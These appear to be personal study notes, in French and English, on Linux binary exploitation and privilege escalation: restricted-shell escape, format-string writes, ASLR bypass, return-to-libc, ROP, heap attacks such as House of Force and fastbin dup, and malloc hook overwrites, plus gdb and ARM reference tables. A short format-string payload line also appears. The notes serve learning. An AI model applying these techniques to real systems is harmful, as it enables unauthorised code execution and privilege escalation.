<ul>

<li><strong>Interrompre le script de démarrage</strong>

<li>
</li>
</ul>
<p>
<strong>Les administrateurs créent souvent des scripts de démarrage développés et</strong>
</p>
<p>
<strong>oublient la gestion de signaux.</strong>
</p>
<p>

    
<img src="images/image237.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Sur ce script, Il suffit que l'utilisateur appuie sur les touches [CTRL]+[C]</strong>
</p>
<p>
<strong>lors de la commande sleep 5 et le script s'arrêtera alors immédiatement avant de mettre en place rbin. l'utilisateur ne sera donc pas limité aux</strong>
</p>
<p>
<strong>commandes du répertoire rbin.</strong>
</p>
<ul>

<li><strong>Téléchargement de la bibliothèque</strong>
</li>
</ul>
<p>
<strong>Une méthode intéressante pour quitter le shell restreint, capable de réussir, </strong>
</p>
<p>
<strong>consiste à charger la bibliothèque spécialement préparée ( shared library</strong>
</p>
<p>
<strong>hijacking ).</strong>
</p>
<p>

<img src="images/image238.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>                     Common Exploitation Techniques</strong>
</p>
<p>

<img src="images/image239.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image240.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image241.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>	</strong>
<img src="images/image242.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>-------------------------------------------------------------------</strong>
</p>
<ul>

<li>
</li>
</ul>
<h3>/etc/shadow file fields</h3>


<p>


<img src="images/image243.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Système de volume logique de linux
</li>
</ul>
<p>
<strong>	</strong>
<img src="images/image244.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Une image à peu près similaire :</strong>
</p>
<p>

<img src="images/image245.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>UNIX-like operating systems distinguish between processes running within the kernel (running in kernel mode) and processes started by users (running in user mode) including the special user root. Memory belonging to the kernel can be accessed via the device files (/dev/kmem) and (/dev/mem).</strong>
</p>
<h3>
            Shared Library Hijacking :</h3>


<p>

<img src="images/image246.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>we can add: 
<ul>
 
<li>Verify if DT_RUNPATH and DT_RPATH are set : echo $DT_RUNPATH ; echo $DT_RPATH. 
<ul>
 
<li>Test LD_PRELOAD (But you can’t execute arbitrary SUID libraries with this variable for security reasons).
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
<p>

<img src="images/image247.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
			     with LD_PRELOAD not mentioned
</p>
<h3>
            MISC</h3>


<p>

<img src="images/image248.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>The encodage “Base64 without padding” consists of removing the “=” at the end and replacing “+” and “/” by “_”. 
</li>
</ul>
<ul>

<li>Booter en <em>mode single user</em> sous Linux permet d'être connecté directement en root sans taper de mot de passe. C'est très utile quand on a perdu le mot de passe root ou que le système refuse de booter correctement, car on est dans un mode minimaliste avec peu de choses démarrées.
</li>
</ul>
<p>
À noter que dans ce mode, les modifications sont temporaires. Elles ne sont
</p>
<p>
pas enregistrées sur le disque et seront perdues au prochain reboot.
</p>
<p>
Linux permet néanmoin de configurer la demande le mot de passe root 
</p>
<p>
même en mode <em>single-user</em>.
</p>
<ul>

<li>All users had their home directory in /home (which is very common). However, it's not always the case (especially for service accounts). You can find the location of this home directory of each user by inspecting /etc/passwd.
</li>
</ul>
<ul>

<li>Administrators often leave files in /tmp as /tmp gets cleanup after each reboot.
<p>

    Therefore, it's really important when auditing or gaining access to a system to see what files you can find in /tmp.
</p>
<p>

    Also administrators often leave files in /var/tmp. But the directory /var/tmp does not get cleanup after each reboot.
</p>
<ul>

<li>The sticky bit ( drwxrwxrwt ) only allows the user who created a file in this directory (or the owner of the directory, ie: root) to modify this file.
</li>
</ul>
</li>
</ul>
<ul>

<li>A vulnerability assessment is designed to find as many flaws as possible in order to make a prioritized list of remediation items
<ul>

<li>A penetration test is designed to see if a mature defense can stop an attacker from achieving one or more specific goals.
<ul>

<li>A red team engagement is designed to continuously test and improve the effectiveness of a company’s blue team by mimicking real-world attackers.
<p>

    A Red Team Assessment is similar to a penetration test in many ways but is more targeted. The goal of the Red Team Assessment is NOT to find as many vulnerabilities as possible. The goal is to test the organization's detection and response capabilities.
</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>
	
</p>
<ul>

<li>Ninja = Red team
<p>

    Pirate = Pentest
</p>
<ul>

<li>When specified at compile time the RPATH ( or RUNPATH ) path is embedded in the binary and is the first path searched when searching for a library.
</li>
</ul>
</li>
</ul>
<ul>

<li>A calling convention is a set of rules dictating how function calls work at the machine level ( assembler ). It is defined by the Application Binary Interface (ABI) for a particular system. For example :
<p>

                Should the parameters be passed through the stack, in registers, or both? 
</p>
</li>
</ul>
<p>

                Should the parameters be passed in from left-to-right or right-to-left? 
</p>
<p>

                Should the return value be stored on the stack, in registers, or both? 
</p>
<p>

                There are many calling conventions, but the popular ones are CDECL, STDCALL, THISCALL, and FASTCALL.
</p>
<p>

        
<img src="images/image249.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>In x86-64, memory addresses are 64 bits long but user space only uses the first 47 bits. If you specify an address above 0x00007fffffffffff, you’ll raise an exception.
</li>
</ul>
<ul>

<li>When an executable file has its setuid bit enabled, it allows anyone to execute the program with the same permissions as the file’s owner.
</li>
</ul>
<ol>

<li>Linux Hardening Rules
</li>
</ol>

<table>
  <tr>
   <td>Règles
   </td>
   <td>Raison
   </td>
   <td>Moyens de vérification
   </td>
  </tr>
  <tr>
   <td>Ne jamais utiliser le mot NOPASSWD pour les règles sudoers
   </td>
   <td>Il est essentiel de laisser cette barrière de protection de l’écriture du mot de passe pour des commandes demandant des droits sudoers
   </td>
   <td>Vérifier les sudoers file présent sur le serveur et look si le mot NOPASSWD est présent
   </td>
  </tr>
  <tr>
   <td>Seuls les composants strictement nécessaires au service rendu par le système doivent
<p>
être installés
   </td>
   <td>
<ul>

<li>Réduire la surface d’attaque au strict minimum
<ul>

<li>Permettre une mise à jour et un suivi du système efficace
<ul>

<li>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
   <td>
<ul>

<li>Look les services en écoute sur les ports et comprendre chacun des services présents
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ol>

<li> PWN - Exploit mistakes in programming and execution
<ul>

<li>Memory leak 
<ul>
 
<li><strong>A memory leak is bad because it can eat the entire RAM. You don't know how much time user will </strong>remain until your<strong> application or </strong>service is opened<strong>. It might be for minutes, hours, days or even months, and once an user has opened your software, if you didn't implement your software in the right way to prevent memory leaks, you can disturb the user or even crash the OS!</strong>
</li> 
</ul>
</li> 
</ul>
</li> 
</ol> 
<ul>
 
<li>
<ul>

<li>﻿Exploits de type “format strings”:
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>Cette exploit peut se faire lorsque l’utilisateur n’utilise pas correctement les fonctions de la famille <em>printf</em> ( avec les opérateurs ).</strong>
<p>

                <strong>Exemple avec printf : </strong>
</p>
<p>

                <strong>﻿printf(user_input) A LA PLACE DE ﻿printf("%s", user_input);</strong>
</p>
<p>

                
<img src="images/image250.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul> 
<ul>
 
<li><strong>formateur %u : entier non-signé.</strong>
 
<li><strong>formateur %x : hexa.</strong>
 
<li><strong>formateur %c : unique caractère.</strong>
 
<li><strong>formateur %f : nombre à virgule.</strong>
 
<li><strong>formateur %s : chaine de caractère.</strong>
 
<li><strong>formateur %n : nombre de bytes écrites jusqu’à ici.</strong>
</li> 
</ul>
<p>
<strong>				</strong>
</p>
<ul>

<li><strong>Il existe 2 types de formateurs :</strong> 
<ul>
 
<li><strong>formateur “directs” : Affiche tout simplement la valeur sur laquelle il se trouve ( dans la pile ) comme le formateur %x.</strong>
</li> 
</ul>
</li> 
</ul>
<p>
<strong>						</strong>
</p>
<ul>

<li><strong>formateur “pointeurs” :  Afficher la valeur POINTÉE par la valeur qu'il cible comme le formateur %s,%n ...</strong>
<ul>

<li><strong>le formateur %n écrit dans la mémoire le nombre de caractères déjà affiché par la fonction à l’adresse qu’il pointe sur la stack.</strong>
</li>
</ul>
</li>
</ul>
<p>
<strong>					</strong>
</p>
<ul>

<li><strong>le formateur %hn écrit 2 octets à la place de 4 octet ( comme le fait %n )</strong>
</li>
</ul>
<p>
<strong>					</strong>
</p>
<ul>

<li><strong>“%5$n” : Cela veut dire : "le cinquième élément de 4 octets sur la pile est un %n”. Cette notation est équivalente à “%x%x%x%x%n” mis à part que les 4 premières valeurs pointées par les %x ne s'afficheront pas.</strong>
</li>
</ul>
<p>
<strong>				</strong>
</p>
<ul>

<li><strong>“%XXXXd” : Génère un entier de taille XXXX digit.</strong>
</li>
</ul>
<p>
<strong>				</strong>
</p>
<p>
<strong>				</strong>
</p>
<ul>

<li><strong>Pour écrire dans la mémoire avec une exploit de type string, il faut envoyer ca a une fonction vulnérable : </strong>
<p>

            <strong>“[ adresse Ou tu veux écrire ] + [ ceux que tu veux écrire à l’adresse voulu] + %[EMPLACEMENT SUR LA PILE DE L’ADRESSE]$n”.</strong>
</p>
</li>
</ul>
<ul>

<li><strong>Pour exécuter un programme sur GDB et sur l’OS avec le même environnement :</strong>
<p>


<img src="images/image251.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
<ul>

<li>L’ASLR
</li>
</ul>
<h4>			Définition</h4>


<p>

            <strong>	ASLR (pour Address Space Layout Randomization) ! Il s’agit d’une protection qui fait varier les adresses de certaines zones mémoires (mais pas toutes) à chaque lancement du programme. </strong>
</p>
<p>

<img src="images/image252.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Bypass ASRL : 
<ul>
 
<li>Brute Force. 
<ul>
 
<li>Any user, able to run 32-bit applications in a x86 machine, can disable the ASLR by setting the RLIMIT_STACK resource to unlimited ( still present in few system Linux): ulimit -s unlimited 
<ul>
 
<li>Utiliser un Offset par rapport à une adresse connu.
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul> 
<ul>
 
<li>Utiliser des exploits bypassant le ASLR ( comme ROP )
</li> 
</ul>
<ul>

<li><strong>PIE : ASLR sur d’autres sections du programme.</strong>
</li>
</ul>
<ul>

<li>SSP ( stack smashing protector )
</li>
</ul>
<p>

<img src="images/image253.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image254.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>RELRO
</li>
</ul>
<p>


<img src="images/image255.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Use-After-Free :  
<ul>
 
<li><strong>Exploitation pouvant être utilisée si une personne après un free() ne met pas le pointeur à NULL. Le pointeur reste actif et pointe toujours vers la même adresse mémoire.</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li>Return-to-libc :  
<ul>
 
<li><strong>Au lieu de modifier l’adresse de retour pour qu’elle pointe sur un shellcode placé dans la pile, l’idée est de la modifier pour qu’elle pointe directement sur la fonction de la bibliothèque libc system(). Le but est d’appeler la fonction system(/bin/sh) pour obtenir un shell.</strong>
<p>

                <strong>Cette attaque peut-être stoppée par l’ASLR.</strong>
</p>
</li> 
</ul>
</li> 
</ul>
<p>

        
<img src="images/image256.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Pour trouver l’adresse de certaines fonctions, on peut utiliser cette commande sur gdb:</strong>
<p>

    
<img src="images/image257.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Une protection contre cette exploitation ( Return-to-libc ) est l’ajout d’un byte 0 dans les adresses libc, empêchant notre exploit de faire passer le payload entier au programme vulnérable.</strong>
<p>

                <strong>Cette protection est contournable.</strong>
</p>
</li>
</ul>
</li>
</ul>
<ul>

<li>ROP - Return Oriented Programming
<ul>

<li><strong>Le ROP consiste à utiliser les instructions machines présentes dans le segment .text (pour rappel, le segment .text contient le code ou plutôt les instructions machines de notre programme). </strong>
<p>

                <strong>Ce segment… n’est pas randomisé par l’ASLR.</strong>
</p>
<p>

                <strong>En gros, on va prendre divers petits bouts de code présents dans la section .text qui, exécutés dans le bon ordre et avec les bons arguments, vont nous permettre d’obtenir ce que nous voulons, à savoir, dans le cas présent, un shell. </strong>
</p>
</li>
</ul>
</li>
</ul>
<p>

<img src="images/image258.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

                <strong>Ainsi, lorsque les instructions que nous voulons effectuer ont été exécutées, l’instruction RET permet de sauter à l’instruction dont l’adresse est sur le dessus de la pile, pile que nous contrôlons grâce au buffer overflow.</strong>
</p>
<p>

                <strong>exemple :</strong>
</p>
<p>

<img src="images/image259.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Shellcode en masse : <a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a></strong>
</p>
<h3>Double free :</h3>


<p>

<img src="images/image260.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Malloc() utilise au minimum 24 bytes comme donnée utilisateur sur chaque chunk de la Heap lors d’une allocation ( même pour un malloc de taille 0 ) sans compter les métadonnées des chunks.</strong>
</li>
</ul>
<ul>

<li><strong>La taille des métadonnées d’un chunk est de 8 bytes.</strong>
</li>
</ul>
<ul>

<li><strong>la heap en x64 augmente de 16 en 16 bytes pour les données utilisateurs.</strong>
</li>
</ul>
<ul>

<li><strong>Each chunk has a size field indicating the size of the chunk.</strong>
</li>
</ul>
<p>

<img src="images/image261.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image262.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>example : </strong>
</p>
<p>

<img src="images/image263.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Ici, sur chaque chunk de couleurs différentes, on a dans les méta données. le nombre 21 signifie :</strong>
</p>
<ul>

<li><strong>1 => le flag n°1. Les 3 derniers bit représentent un flag activé ( see below ). ici, le prev_inuse flag qui est activé.</strong>

<li><strong>0x20: taille du chunk ( 32 bytes ici ) </strong>
</li>
</ul>
<ul>

<li><strong>Since all chunks are multiples of 8 bytes, the 3 LSBs of the chunk size can be used for flags. These three flags are defined as follows:</strong>
</li>
</ul>
<ul>

<li><strong>A (0x04)</strong>
<p>

        <strong>Allocated Arena - the main arena uses the application's heap. Other arenas use mmap'd heaps. To map a chunk to a heap, you need to know which case applies. If this bit is 0, the chunk comes from the main arena and the main heap. If this bit is 1, the chunk comes from mmap'd memory and the location of the heap can be computed from the chunk's address.</strong>
</p>
<ul>

<li><strong>M (0x02)</strong>
<p>

        <strong>MMap'd chunk - this chunk was allocated with a single call to mmap and is not part of a heap at all.</strong>
</p>
<ul>

<li><strong>P (0x01)</strong>
<p>

        <strong>Previous chunk is in use - if set, the previous chunk is still being used by the application, and thus the prev_size field is invalid. Note - some chunks, such as those in fastbins (see below) will have this bit set despite being free'd by the application. This bit really means that the previous chunk should not be considered a candidate for coalescing - it's "in use" by either the application or some other optimization layered atop malloc's original code.</strong>
</p>
<p>

        <strong>Le premier chunk a toujours ce flag activé.</strong>
</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>De base, sur la Heap, il n’y a qu’un seul principal chunk qu’on appelle “Top Chunk”. Au fur et à mesure qu’on alloue de la mémoire, ce chunk baisse en taille.</strong>
<p>

    <strong>On peut récupérer, comme information sur ce chunk, combien il reste de place dans la Heap.</strong>
</p>
</li>
</ul>
<p>

<img src="images/image264.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image265.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>The House of Force attack
</li>
</ul>
<p>
Publiée en 2005, <strong>Cette attaque se concentre sur la taille affichée en mémoire du top chunk. Avec un possible Heap Overflow, on peut écraser cette valeur.</strong>
</p>
<p>
<strong> </strong>
</p>
<p>
<strong>On peut alors tromper certaines fonctions comme malloc() qui utilise cette valeur pour allouer de la mémoire correctement.</strong>
</p>
<p>
<strong>Cette attaque se base aussi sur le fait que l’on utilise une ancienne version de la biblio GLIBC ( &lt; 2.29 ), qui laquelle il n'y a aucun check sur la taille du Top chunk.</strong>
</p>
<p>
<strong>	</strong>
</p>
<p>
<strong>La présence d’une feature que l’on nomme "tcache" ( présent sur des anciennes versions de GLIBC ) rend plus facile des exploit sur malloc().</strong>
</p>
<p>
<strong>Etape :</strong>
</p>
<ul>

<li><strong>Heap overflow pour écraser le size field du top chunk. Donc maintenant la heap est très grande.</strong>
<ul>

<li><strong>Ecrire ou on veut dans les sections du binaire. ( request enough memory to bridge the gap between the top chunk and target data and then overwrite the target with other allocation).</strong>
</li>
</ul>
</li>
</ul>
<p>
<strong>	</strong>
</p>
<p>
<strong>	On peut même écrire à des adresses plus basses car c’est un système</strong>
</p>
<p>
<strong>“modulo max_size_or_value”. </strong>
</p>
<p>
<strong>GLIBC version 2.30 introduced a maximum allocation size check, which limits the size of the gap the House of Force can bridge.</strong>
</p>
<h3>Code execution techniques :</h3>


<ul>

<li><strong>For code execution, you can for example overwrite the plt section to overwrite the address of printf() in instance if it’s possible if RELRO isn’t activated ).</strong>
</li>
</ul>
<ul>

<li><strong>You can overwrite the .fini_array slots, if you can lead the program into exiting because the process of exiting use the slots of this array ( if RELRO isn’t activated ). </strong>
</li>
</ul>
<ul>

<li><strong>You can overwrite __exit_funcs or tls_dtor_list qui se comportent pareil que .fini_array ( qui se trouvent dans une autre PLT de GLIBC ) mais c’est largement plus dur.</strong>
</li>
</ul>
<ul>

<li><strong>You can use mallocs hooks : Each of malloc's core functions, such as malloc() and free(), has an associated hook which takes the form of a writable function pointer in GLIBC's data section.</strong>
<p>

    <strong>When the value of the malloc hook is null, it's ignored and calls to the malloc() function  work as normal. When it isn't null however, calls to malloc() are redirected to the address that it holds.</strong>
</p>
<p>

    <strong>You can find the address of the malloc hook with some general variables.</strong>
</p>
<p>

    <strong>If you can replace the malloc hook by system(“/bin/sh”) for example, you can put the argument of the system function in the size malloc argument as an address pointing to the correct strings in the memory ( here “/bin/sh” ). That will trigger the hijacked hook with the right argument. </strong>
</p>
</li>
</ul>
<ul>

<li>The Fastbin dups ( duplication ) attack
</li>
</ul>
<p>
<strong>	Definitions :</strong>
</p>
<ul>

<li><strong>fastbins : The collection of chunks that have been freed.</strong>

<li><strong>Arenas : Arenas are structures in which malloc keeps all of its non-inline metadata, consisting primarily of the heads of each of those free lists I mentioned.</strong>
<p>

        <strong>A single arena can administrate multiple heaps.</strong>
</p>
<p>

        <strong>A new arena is created along with an initial heap every time a thread uses malloc for the first time, up to a limit based on the number of available cores.</strong>
</p>
<p>

        <strong>The main thread gets a special arena called the main arena, which resides in the libc data section.</strong>
</p>
</li>
</ul>
<p>

<img src="images/image266.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Fonctionnement des fastbins : </strong>
</p>
<p>


<img src="images/image267.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>l’attaque :
</li>
</ul>
<p>

<img src="images/image268.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h3>
    MISC</h3>


<ul>

<li>S﻿OURCE FORTIFY : remplacement de fonctions dangereuses par sa version sécurisée: strcpy=>strncpy.
</li>
</ul>
<ul>

<li>﻿NX : la pile et le tas d'un programme NON exécutables..
</li>
</ul>
<ul>

<li>0x90 : instruction NOP.
</li>
</ul>
<ul>

<li>Un ShellCode peut être stocké dans une variable d’environnement à la place d’être écrit directement dans un buffer car ca prendra moin de place dans le “payload”. 
<ul>

<li>Pour les programmeurs, des overflows peuvent aussi apparaître dans des boucles for ou while s’il y a des erreurs avec les indices ou dans la condition de la boucle par exemple.
<p>

            Ces overflows peuvent être très difficiles à détecter. Ces bugs sont appelés off-by-one bugs car ils peuvent avoir lieu seulement sur un ou quelques bytes.
</p>
<p>

            Il faut noter que ces bugs off-by-one sur certains programmes compilés avec gcc sont peut-être inexploitables. Les versions 3.x de gcc ajoutent un padding entre les variables locales et
</p>
<p>

            frame pointer ce qui rend ce dernier inaccessible à un off-by-one bug.
</p>
</li>
</ul>
</li>
</ul>
<ul>

<li>Dans le processus d’écriture d’un shellcode : 
<ul>
 
<li>Il y a le fait de réduire leur taille au minimum dans la mémoire afin de l’utiliser dans des petits buffers.
</li> 
</ul>
</li> 
</ul>
<ul>

<li>Enlever les bytes NULL car ils agissent comme des terminateurs pour les strings.
</li>
</ul>
<ul>

<li>Le shellcode doit être PIC ( position independent code ), c-à-dire il ne doit contenir aucune adresse absolue car l’adresse où le shellcode est exécuté est généralement pas connue.
<p>

    
<img src="images/image269.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ol>

<li> Gdb command

<li><strong>disass [FUNCTION] : produce the disassembly output of the entire function.</strong>
</li>
</ol>
</li>
</ul>
<ul>

<li><strong>set disassembly-flavor [ att - intel ] : Controls the disassembly style used by the <a href="https://visualgdb.com/gdbreference/commands/disassemble">disassemble</a> and <a href="https://visualgdb.com/gdbreference/commands/x">x</a> commands.</strong>
<p>

            <strong>att : AT&T disassembly style</strong>
</p>
<p>

            <strong>intell : Intel disassembly style</strong>
</p>
</li>
</ul>
<ul>

<li><strong>show disassembly-flavor : print the disassembly style used.</strong>
</li>
</ul>
<ul>

<li><strong>layout split : Display the source and assembly window.</strong>
</li>
</ul>
<ul>

<li><strong>i r | info registers = prints the main registers.</strong>
</li>
</ul>
<ul>

<li><strong>x/20xw $esp : Tip to print the stack .</strong> 
<ul>
 
<li><strong>w = 16 bits</strong>
 
<li><strong>x = Hex</strong>
</li> 
</ul>
</li> 
</ul>
<p>
<strong>	</strong>
</p>
<ul>

<li><strong>Clear : remove breakpoints.</strong>
</li>
</ul>
<ul>

<li><strong>p [ register ] : print the content of the register.</strong>
</li>
</ul>
<ul>

<li><strong>reverse-stepi : revenir un pas en arrière.</strong>
</li>
</ul>
<ul>

<li><strong>call [function name] : call a function inside the binary.</strong>
</li>
</ul>
<ul>

<li><strong>set {char}0x080486fc=0x74 = change la valeur a l’adresse 0x080486fc.</strong>
<ul>

<li><strong>print/x [REGISTER] = Print the value of the register.</strong>

<li><strong>print (char*) 0x555555556004</strong>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>define hook-stop : makes the associated commands ( to the hook ) execute every time execution stops in your program: before breakpoint commands are run, displays are printed, or the stack frame is printed.</strong>
<p>

                <strong>Example of a hook:</strong>
</p>
<p>

                <strong>	</strong>
<img src="images/image270.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>bt = Montre l’empilement des frames sur la piles.</strong>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>i f = Donne des informations sur la frame actuelle.</strong>
</li>
</ul>
<ul>

<li><strong>i f n = Donne des informations sur la frame numéro n.</strong>
</li>
</ul>
<ul>

<li><strong>find Start_address,end_address,pattern = trouve le pattern entre les 2 adresses de début et fin.</strong>
<ul>

<li><strong>run &lt; &lt;(python -c "print '%121x' + '\x86\xfd\xff\xbf'") : Formater un input sur GDB avec python.</strong>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>info files : Display what different segments are there in the core file.</strong>
</li>
</ul>
<ul>

<li><strong>x/30s *((char **)environ) : Afficher les adresses des variables d’environnements.</strong>
</li>
</ul>
<ul>

<li><strong>To switch a flag on the statue register (here GDB syntax):</strong> 
<ul>
 
<li><strong> 0 -> 1 OR: ﻿set ($eflags) |= 0x[BIT_VALUE_ON_STATUE_REGISTER] </strong>
<p>

                <strong> </strong>
</p> 
<ul>
 
<li><strong> 1 -> 0 XOR: set ($eflags) ^= 0x[BIT_VALUE_ON_STATUE_REGISTER] </strong>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>Technique pour trouver l’offset jusqu'à EIP avec gdb-peda :</strong>
<p>

    
<img src="images/image271.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
<p>

<img src="images/image272.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

        
<img src="images/image273.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>find [BEGIN_ADD], [AND_ADD], [VALUE] : search for value between address</strong>
</li>
</ul>
<p>
<strong>	Example : find 0x555555554000 to 0x555555558fff, “Hello, world!”</strong>
</p>
<ul>

<li>Technique pour trouver le main dans un binaire stripped : 
<ul>
 
<li>1) info file pour voir ou se trouve .txt
 
<li>2) disass [DEBUT .TXT], [FIN .TXT]
</li> 
</ul>
</li> 
</ul>
<ul>

<li>1) break _libc_start_main

<li>2) run and check the first argument of this function. this is where the main start
</li>
</ul>
<ul>

<li>
</li>
</ul>
<ol>

<li>ARM

<li>Differents instructions
</li>
</ol>
<p>

<img src="images/image274.png" width="" alt="alt_text" title="image_tooltip">

</p>

<table>
  <tr>
   <td><strong>cpy r0, r2</strong>
   </td>
   <td><strong>mov r0, r2</strong>
   </td>
  </tr>
  <tr>
   <td><strong>bcs [ADDRESS]</strong>
   </td>
   <td><strong>Jump avec CS condition</strong>
   </td>
  </tr>
</table>



<table>
  <tr>
   <td>Move R2 ,#4
   </td>
   <td>R2 = #4
   </td>
  </tr>
  <tr>
   <td>B ( Branch )
   </td>
   <td>Simple Jump ( up to 32 MB )
   </td>
  </tr>
  <tr>
   <td>BL ( Branch and Link )
   </td>
   <td>Preserves the addresses of the instruction after the branch ( in LR )
   </td>
  </tr>
  <tr>
   <td>BX ( Branch and Exchange )
   </td>
   <td>Uses the content of a general-purpose register to decide where to jump and  exchange instruction set.
   </td>
  </tr>
  <tr>
   <td>ldr r0, addr_var1
   </td>
   <td>Load to R0 the value stored in addr_var1.
   </td>
  </tr>
  <tr>
   <td>str r2, [r1, #2]
   </td>
   <td>Store the value found in r2 to the memory address found in r1+2. R1 stay unmodified
   </td>
  </tr>
  <tr>
   <td>str r2, [r1, #2]!
   </td>
   <td>Store the value found in r2 to the memory address found in r1+2. R1 is modified : r1 = r1 + 2
   </td>
  </tr>
  <tr>
   <td>ldr r3, [r1], #4
   </td>
   <td>load the value found in memory address found in r1 to r3. R1 is modified : r1 = r1 + 4
   </td>
  </tr>
  <tr>
   <td>str r2, [r1,+ r2, LSL#2]
   </td>
   <td>Store the value found in r2 to the memory address found in r1+( r2 left-shifted by 2 ). R1 stay unmodified
   </td>
  </tr>
  <tr>
   <td>ldr r0, =jump 
   </td>
   <td>load the address of the function label jump into r0
   </td>
  </tr>
  <tr>
   <td>ldr r1, =0x68DB00AD
   </td>
   <td>load the value 0x68DB00AD into r1
   </td>
  </tr>
  <tr>
   <td>adr r0, words+12 
   </td>
   <td>address of words[3] -> r0
   </td>
  </tr>
  <tr>
   <td>ldm r0, {r4, r5}
   </td>
   <td>[r4]= [r0]  
<p>
[r5]= [r0 + 4]
   </td>
  </tr>
  <tr>
   <td>stm r1, {r4, r5}
   </td>
   <td>[r1] = [r4] , 
<p>
[r1 + 4] = [r5]
   </td>
  </tr>
  <tr>
   <td>ldmia r0, {r4-r6}
   </td>
   <td>[r4] = [r0]
<p>
[r5] = [r0 + 4]
<p>
[r6] = [r0 + 8]
   </td>
  </tr>
  <tr>
   <td>stmia r0, {r4-r6}
   </td>
   <td>[r0] = [r4]
<p>
[r0 + 4] = [r5]
<p>
[r0 + 8] = [r6]
   </td>
  </tr>
  <tr>
   <td>ldmib r0, {r4-r6}
   </td>
   <td>[r4] = [r0 + 4]
<p>
[r5] = [r0 + 8]
<p>
[r6] = [r0 + 12]
   </td>
  </tr>
  <tr>
   <td>stmib r0, {r4-r6}
   </td>
   <td>[r0 + 4] = [r4]
<p>
[r0 + 8] = [r5]
<p>
[r0 + 12] = [r6]
   </td>
  </tr>
  <tr>
   <td>ldmda r0, {r4-r6}
   </td>
   <td>[r6] = [r0]
<p>
[r5] = [r0 - 4]
<p>
[r4] = [r0 - 8]
   </td>
  </tr>
  <tr>
   <td>ldmdb r0, {r4-r6}
   </td>
   <td>[r6] = [r0 - 4]
<p>
[r5] = [r0 - 8]
<p>
[r4] = [r0 - 12]
   </td>
  </tr>
  <tr>
   <td>stmda r0, {r4-r6}
   </td>
   <td>[r0] = [r6]
<p>
[r0 - 4] = [r5]
<p>
[r0 - 8] = [r4]
   </td>
  </tr>
  <tr>
   <td>stmdb r0, {r4-r6}
   </td>
   <td>[r0 - 4] = [r6]
<p>
[r0 - 8] = [r5]
<p>
[r0 - 12] = [r4]
   </td>
  </tr>
</table>


<ul>

<li><strong>R13 : Stack pointer ( like ESP ).</strong>
</li>
</ul>
<ul>

<li><strong>R14 ( LR ) : Link register ( function like EIP ). </strong>
</li>
</ul>
<ul>

<li><strong>R15 : PC register.</strong>
</li>
</ul>
<ul>

<li><strong>R11 : Pointer to the current frame ( FP, like EBP ).</strong>
</li>
</ul>
<ul>

<li><strong>R12 : Can be corrupted with temporary data in a called subroutine.</strong>
</li>
</ul>
<ul>

<li><strong>R0 -> R3 : Hold function arguments.</strong>
</li>
</ul>
<h3>						CPSR</h3>


<ul>

<li><strong>CPSR : register for operating processor status. It contains 2 bits that encode whether ARM inst., Thumb inst., or Jazelle opcodes are being executed.</strong>
</li>
</ul>
<p>

<img src="images/image275.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image276.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image277.png" width="" alt="alt_text" title="image_tooltip">
<strong>		</strong>
</p>
<h3>
        condition codes :</h3>


